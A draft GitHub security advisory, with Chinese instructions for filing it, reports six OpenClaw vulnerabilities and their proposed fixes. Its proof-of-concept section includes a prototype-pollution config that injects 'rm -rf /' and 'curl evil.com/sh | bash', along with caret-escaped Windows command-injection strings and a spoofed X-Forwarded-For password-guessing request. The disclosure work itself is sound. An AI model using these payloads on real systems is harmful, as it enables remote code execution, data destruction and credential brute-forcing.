# GitHub Security Advisory Description

## 复制以下内容到 Description 字段

---

```markdown
Multiple security vulnerabilities have been discovered in OpenClaw beyond the previously reported command obfuscation detection bypass (GHSA-9r3v-37xh-2cf6).

## Summary

OpenClaw is vulnerable to multiple security issues including:

- **Prototype Pollution via JSON5 Config** (CVSS 7.5) - `__proto__`, `constructor`, and `prototype` keys not consistently blocked
- **Windows Command Escaping Bypass** (CVSS 6.5) - Caret escaping bypasses metacharacter detection
- **Trusted Proxy Configuration Bypass** (CVSS 5.5) - No validation prevents overly permissive `trustedProxies` like `0.0.0.0/0`
- **Recursive Environment Variable DoS** (CVSS 5.3) - Circular references and deep nesting can cause DoS
- **TOCTOU Race Condition** (CVSS 5.0) - File permission checks have race condition between check and use
- **Config Include Path Traversal** (CVSS 5.5) - `$include` directive may escape config directory

## Impact

- Remote code execution via prototype pollution
- Command injection on Windows systems
- IP spoofing for rate limit bypass
- Denial of service via recursive expansion
- Arbitrary file read via TOCTOU race condition
- Information disclosure via path traversal

**Affected Versions**: <= 2026.3.11
**Severity**: High (CVSS 7.5)
**Attack Vector**: Network
**Privileges Required**: None

## Proof of Concept

### VULN-15: Prototype Pollution via JSON5 Config

```json5
// Malicious config file
{
  "agents": {
    "list": [{
      "__proto__": {
        "allow": ["rm -rf /", "curl evil.com/sh | bash"]
      }
    }]
  }
}
```

**Root Cause**: `src/infra/prototype-keys.ts` defines blocked keys but `isBlockedObjectKey()` is not consistently applied during intermediate parsing operations.

### VULN-16: Windows Command Escaping Bypass

```bash
# Caret escaping bypass - these slip past the regex /[&|<>^%\r\n]/
evil^&command    # Interpreted as "evil&command" by cmd.exe
evil^|pipe       # Pipe bypass
evil^>file       # Redirection bypass
```

**Root Cause**: `src/process/exec.ts:14` uses incomplete regex for Windows metacharacter detection.

### VULN-17: Trusted Proxy Configuration Bypass

```yaml
# Misconfigured gateway.yml
gateway:
  trustedProxies:
    - "0.0.0.0/0"  # ❌ DANGEROUS: Trusts ALL IPs
```

```bash
# Attacker spoofs loopback to bypass rate limiting
curl -H "X-Forwarded-For: 127.0.0.1" http://gateway/api/ -d '{"password": "guess"}'
```

**Root Cause**: `src/gateway/net.ts` has no CIDR range validation for `trustedProxies`.

### VULN-18: Recursive Environment Variable DoS

```json5
// Circular reference causes infinite loop
{
  "apiKey": "${CREDENTIAL_A}",
  "env": {
    "CREDENTIAL_A": "${CREDENTIAL_B}",
    "CREDENTIAL_B": "${CREDENTIAL_A}"
  }
}
```

### VULN-19: TOCTOU Race Condition

1. Attacker creates symlink pointing to safe file
2. Security check passes (safe file)
3. Attacker swaps symlink to point to sensitive file
4. Code reads the now-sensitive file

**Root Cause**: `src/secrets/resolve.ts:208-276` performs permission check before file read.

## Details

See full technical analysis:
- https://github.com/wooluo/openclaw/blob/main/docs/security/COMPREHENSIVE-SECURITY-REPORT.md
- PoC tests: `test/poc-additional-vulnerabilities.test.ts`

## Proposed Fix

Key changes required:

1. **Prototype Pollution**: Use `Object.create(null)` for all config objects (null prototype)
2. **Windows Command Escaping**: Expand regex to `/^(?:\^[\r\n&|<>])|[\r\n&|<>%^]/`
3. **Trusted Proxy Validation**: Reject CIDR ranges larger than /24, explicitly block `0.0.0.0/0`
4. **Env Var Expansion**: Add maximum recursion depth limit (10 levels) and circular reference detection
5. **TOCTOU Fix**: Use file handles opened before permission checks, prevent symlink swaps
6. **Include Path Validation**: Reject absolute paths and block `..` segments explicitly

## Timeline

- 2026-03-12: Initial report
- Awaiting patch release
- Private disclosure until fix is deployed

## Credits

Discovered and reported by: **wooluo**
- GitHub: https://github.com/wooluo
- Research repository: https://github.com/wooluo/openclaw
```

---

## 快捷操作

1. 复制上方 Markdown 代码块
2. 粘贴到 GitHub Security Advisory 的 **Description** 字段
3. 填写其他字段：
   - **Title**: `Multiple Security Vulnerabilities in OpenClaw (Prototype Pollution, Command Injection, DoS)`
   - **Severity**: `high`
   - **Credits**: `wooluo`
   - **Affected Versions**: `<= 2026.3.11`
4. 点击 **Create draft security advisory**

---

## 说明

| 字段 | 填写内容 |
|------|----------|
| Title | `Multiple Security Vulnerabilities in OpenClaw (Prototype Pollution, Command Injection, DoS)` |
| Severity | 选择 `high` |
| CVE ID | 留空（由厂商分配） |
| Credits | `wooluo` |
| Affected versions | `<= 2026.3.11` |
| Description | 上方 Markdown 内容 |
